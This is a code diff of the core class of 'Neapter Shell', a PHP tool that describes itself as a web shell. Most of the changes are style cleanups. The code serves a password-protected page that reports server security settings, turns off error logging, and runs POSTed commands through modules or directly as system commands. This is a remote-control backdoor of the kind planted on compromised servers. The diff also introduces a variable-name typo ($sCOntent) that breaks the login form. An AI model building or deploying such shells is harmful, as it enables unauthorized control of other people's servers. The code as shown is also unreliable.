@@ -3,10 +3,13 @@
 /**
  * Neapter Shell
  *
+ * @category  WebShell
+ * @package   NeapterShell
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
+ * @copyright 2011-2016 Krzysztof Otręba
  *
- * @license   http://www.gnu.org/licenses/gpl-3.0.txt
+ * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
+ * @link    http://github.com/krzotr/neapter-shell
  */
 
 /**
@@ -47,18 +50,17 @@ require_once dirname(__FILE__) . '/Args.php';
 require_once dirname(__FILE__) . '/Utils.php';
 
 /**
- * class Shell - Zarzadzanie serwerem
+ * NeapterSHell - WebShell, PHP Server manager
  *
+ * @category  WebShell
+ * @package   NeapterShell
+ * @version   1.0.0-dev
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
+ * @copyright 2011-2016 Krzysztof Otręba
  *
- * @version 1.0.0-dev
- *
- * @package NeapterShell
- *
- * @uses Arr
- * @uses Request
- * @uses Form
+ * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
+ * @link    http://github.com/krzotr/neapter-shell
+ * @link    http://www.php.net/manual/en/class.recursivedirectoryiterator.php#101654
  */
 class Shell
 {
@@ -68,20 +70,18 @@ class Shell
     const VERSION = '1.0.0-dev';
 
     /**
-     * Dane do uwierzytelniania, jezeli wartosc jest rowna NULL, to shell nie jest chroniony haslem
+     * Dane do uwierzytelniania, jezeli wartosc jest rowna null, to shell nie jest chroniony haslem
      *
      * format: sha1( $sUser . "\xff" . $sPass );
      *
-     * @access protected
-     * @var    string
+     * @var string
      */
     protected $sAuth;
 
     /**
      * Czas generowania strony
      *
-     * @access protected
-     * @var    float
+     * @var float
      */
     protected $fGeneratedIn;
 
@@ -89,50 +89,44 @@ class Shell
      * Nazwa polecenie
      * ':test' => 'test'
      *
-     * @access protected
-     * @var    string
+     * @var string
      */
     protected $sCmd;
 
     /**
      * Parsowanie argumentow
      *
-     * @access protected
-     * @var    object
+     * @var object
      */
     protected $oArgs;
 
     /**
      * Zestaw narzędzie
      *
-     * @access protected
-     * @ver    object
+     * @var object
      */
     protected $oUtils;
 
     /**
-     * Jezeli TRUE to dzialamy w srodowisku deweloperskim (wlaczane wyswietlanie i raportowanie bledow)
+     * Jezeli true to dzialamy w srodowisku deweloperskim (wlaczane wyswietlanie i raportowanie bledow)
      *
-     * @access public
-     * @var    boolean
+     * @var boolean
      */
-    protected $bDev = FALSE;
+    protected $bDev = false;
 
     /**
-     * Jezeli FALSE to skrypty JavaScript sa wlaczone
+     * Jezeli false to skrypty JavaScript sa wlaczone
      *
-     * @access public
-     * @var    boolean
+     * @var boolean
      */
-    protected $bNoJs = FALSE;
+    protected $bNoJs = false;
 
     /**
      * Konstruktor
      *
      * @param string $sArgs Arguments to execute commands
-     * @access public
      */
-    public function __construct($sArgs = NULL)
+    public function __construct($sArgs = null)
     {
         /**
          * Czas generowania strony a w zasadzie shella
@@ -210,7 +204,7 @@ class Shell
             ini_set('date.timezone', 'Europe/Warsaw');
             ini_set('html_errors', 0);
             ini_set('log_errors', 0);
-            ini_set('error_log', NULL);
+            ini_set('error_log', null);
         } else {
             date_default_timezone_set('Europe/Warsaw');
         }
@@ -250,20 +244,23 @@ class Shell
 
         $sAuth = $this->oUtils->cacheGet($this->oUtils->getAuthFileKey());
 
-        $sPassword = sha1($this->sAuth . Request::getServer('REMOTE_ADDR'), TRUE);
+        $sPassword = sha1($this->sAuth . Request::getServer('REMOTE_ADDR'), true);
 
         if ($sAuth !== $sPassword) {
             /**
              * Sprawdzanie poprawnosci sha1( "user\xffpass" );
              */
             if ($this->sAuth !== sha1(Request::getPost('user') . "\xff" . Request::getPost('pass'))) {
-                $this->bNoJs = TRUE;
+                $this->bNoJs = true;
 
-                echo $this->getContent(
-                    sprintf('<form action="%s" method="post"><input type="text" name="user"/><input type="password" name="pass"/><input type="submit" name="submit" value="Go !"/></form>',
-                        Request::getCurrentUrl()
-                    ), FALSE
+                $sContent = sprintf(
+                    '<form action="%s" method="post">' .
+                    '<input type="text" name="user"/><input type="password" name="pass"/>' .
+                    '<input type="submit" name="submit" value="Go !"/></form>',
+                    Request::getCurrentUrl()
                 );
+
+                echo $this->getContent($sCOntent, false);
                 exit;
             }
 
@@ -274,12 +271,11 @@ class Shell
     /**
      * Pobieranie statusu TAK / NIE
      *
-     * @access private
-     * @param  boolean $bValue Wartosc
+     * @param  boolean $bValue    Wartosc
      * @param  boolean $bNegative Negacja 1, 0 zwroci zielone TAK, 1, 1 zwroci czerwone TAK
      * @return string             Status
      */
-    private function getStatus($bValue, $bNegative = FALSE)
+    private function getStatus($bValue, $bNegative = false)
     {
         return sprintf(
             '<span class="%s">%s</span>',
@@ -291,7 +287,6 @@ class Shell
     /**
      * Pobieranie menu
      *
-     * @access private
      * @return string  Menu w HTMLu
      */
     private function getMenu()
@@ -305,12 +300,12 @@ class Shell
             'TMP: <strong>%s</strong><br/>' .
             'Zablokowane funkcje: <strong>%s</strong><br/>',
             phpversion(),
-            $this->getStatus($this->oUtils->isSafeMode(), TRUE),
-            ((($sBasedir = ini_get('open_basedir')) === '') ? $this->getStatus(0, TRUE) : $sBasedir),
+            $this->getStatus($this->oUtils->isSafeMode(), true),
+            ((($sBasedir = ini_get('open_basedir')) === '') ? $this->getStatus(0, true) : $sBasedir),
             php_sapi_name(),
             php_uname(),
             $this->oUtils->getTmpDir(),
-            (($sDisableFunctions = implode(',', $this->oUtils->getDisabledFunctions()) === '') ? 'Brak' : $sDisableFunctions)
+            (($sDisFunc = implode(',', $this->oUtils->getDisabledFunctions()) === '') ? 'Brak' : $sDisFunc)
         );
     }
 
@@ -319,22 +314,21 @@ class Shell
      *
      * @param string $sCmd Command to execute
      *
-     * @access public
      * @return string
      */
-    public function getCommandOutput($sCmd = NULL)
+    public function getCommandOutput($sCmd = null)
     {
-        $bRaw = ($sCmd !== NULL);
+        $bRaw = ($sCmd !== null);
 
         /**
          * Zawartosc konsoli
          */
-        $sConsole = NULL;
+        $sConsole = null;
 
         /**
          * Domyslna komenda to :ls -l sciezka_do_katalogu
          */
-        if ($sCmd === NULL) {
+        if ($sCmd === null) {
             if (PHP_SAPI === 'cli') {
                 /**
                  * Zmienne globalne to zlo ;), to powinno zostac przekazane
@@ -344,7 +338,7 @@ class Shell
                 array_shift($aArgv);
 
                 $sCmd = implode($aArgv, ' ');
-            } else if (Request::getPost('cmd') === FALSE) {
+            } elseif (Request::getPost('cmd') === false) {
                 $sCmd = ':ls -l ' . dirname(Request::getServer('SCRIPT_FILENAME'));
             } else {
                 $sCmd = (string) Request::getPost('cmd');
@@ -360,7 +354,7 @@ class Shell
                 $this->sCmd = (string) substr($sCmd, 1);
             }
 
-            $this->oArgs = new Args(ltrim(preg_replace(sprintf('~^\:%s[\s+]?~', $this->sCmd), NULL, $sCmd)));
+            $this->oArgs = new Args(ltrim(preg_replace(sprintf('~^\:%s[\s+]?~', $this->sCmd), null, $sCmd)));
 
             $aModules = $this->oUtils->getCommands();
 
@@ -369,7 +363,7 @@ class Shell
              */
             if ($aModules === array()) {
                 $sConsole = 'Nie wczytano żadnych modułów !!!';
-            } else if (isset($aModules[$this->sCmd])) {
+            } elseif (isset($aModules[$this->sCmd])) {
                 $sModule = $aModules[$this->sCmd];
                 $oModule = new $sModule($this, $this->oUtils, $this->oArgs);
 
@@ -387,11 +381,8 @@ class Shell
             }
         } elseif ($sCmd === '') {
             $sConsole = 'Wpisz ":help", by zobaczyć pomoc';
-        }
-        /**
-         * Wykonanie komendy systemowej
-         */
-        else if (class_exists('ModuleSystem')) {
+            /* Execute system command */
+        } elseif (class_exists('ModuleSystem')) {
             $this->oArgs = new Args(preg_replace('~^:[^ ]+\s+~', '', $sCmd));
             $oSystem = new ModuleSystem($this, $this->oUtils, $this->oArgs);
 
@@ -402,13 +393,14 @@ class Shell
             return htmlspecialchars_decode($sConsole) . "\r\n";
         }
 
-        $sContent = sprintf('<pre id="console">%s</pre><br/>' .
+        $sContent = sprintf(
+            '<pre id="console">%s</pre><br/>' .
             '<form action="%s" method="post">' .
             '<input type="text" name="cmd" value="%s" size="110" id="cmd" autocomplete="on"/>' .
             '<input type="submit" name="submit" value="Execute" id="cmd-send"/></form>',
             $sConsole,
             Request::getCurrentUrl(),
-            htmlspecialchars(((($sVal = Request::getPost('cmd')) !== FALSE) ? $sVal : (string) $sCmd))
+            htmlspecialchars(((($sVal = Request::getPost('cmd')) !== false) ? $sVal : (string) $sCmd))
         );
 
         return $this->getContent($sContent);
@@ -417,18 +409,12 @@ class Shell
     /**
      * Pobieranie calosci strony
      *
-     * @uses   Request
-     *
-     * @access private
-     * @param  string $sData Zawartosc strony
+     * @param  string  $sData         Zawartosc strony
      * @param  boolean $bExdendedInfo [Optional]<br>Czy wyswietlac informacje o wersji PHP, zaladowanych modulach itp
      * @return string
      */
-    private function getContent($sData, $bExdendedInfo = TRUE)
+    private function getContent($sData, $bExdendedInfo = true)
     {
-        /**
-         * isAjax
-         */
         if (Request::isAjax()) {
             preg_match('~<pre id="console">(.*)</pre>~s', $sData, $aMatch);
 
@@ -439,10 +425,7 @@ class Shell
             return $aMatch[1];
         }
 
-        /**
-         * Wylaczenie JavaScript
-         */
-        $sScript = NULL;
+        $sScript = null;
         if (!$this->bNoJs) {
             $sScript = '<script src="?js"></script>';
         }
@@ -451,11 +434,14 @@ class Shell
         $sGeneratedIn = sprintf('%.5f', microtime(1) - $this->fGeneratedIn);
         $sTitle = sprintf('NeapterShell @ %s (%s)', Request::getServer('HTTP_HOST'), Request::getServer('SERVER_ADDR'));
         $sVersion = self::VERSION;
-        return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8\"><link href=\"?css\" type=\"text/css\" media=\"all\" rel=\"stylesheet\"/></head><body><div id=\"body\">" .
-        ($bExdendedInfo ? "<div id=\"menu\">{$sMenu}</div>" : NULL) .
-        "<div id=\"content\">{$sData}</div></div>" .
-        ($bExdendedInfo ? "<div id=\"bottom\">Wygenerowano w: <strong>{$sGeneratedIn}</strong> s | Wersja: <strong>{$sVersion}</strong></div>" : NULL) .
-        "</div>{$sScript}</body></html>";
+        return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title>" .
+            "<meta charset=\"utf-8\"><link href=\"?css\" type=\"text/css\" media=\"all\" rel=\"stylesheet\"/>" .
+            "</head><body><div id=\"body\">" .
+            ($bExdendedInfo ? "<div id=\"menu\">{$sMenu}</div>" : '') .
+            "<div id=\"content\">{$sData}</div></div>" .
+            ($bExdendedInfo ? "<div id=\"bottom\">Wygenerowano w: <strong>{$sGeneratedIn}</strong> s | " .
+                "Wersja: <strong>{$sVersion}</strong></div>" : '') .
+            "</div>{$sScript}</body></html>";
     }
 
     protected function getHttpCacheHeaders()
@@ -477,14 +463,13 @@ class Shell
         header('Content-type: text/css');
         $this->getHttpCacheHeaders();
 
-        echo file_get_contents(dirname(Request::getServer('SCRIPT_FILENAME')) . '/Styles/haxior.css');;
+        echo file_get_contents(dirname(Request::getServer('SCRIPT_FILENAME')) . '/Styles/haxior.css');
         exit;
     }
 
     /**
      * Wyswietlanie strony
      *
-     * @access private
      * @return void
      */
     public function get()
@@ -548,5 +533,4 @@ class Shell
         $this->bDev = (bool) $bValue;
         $this->loadDevConfig();
     }
-
 }
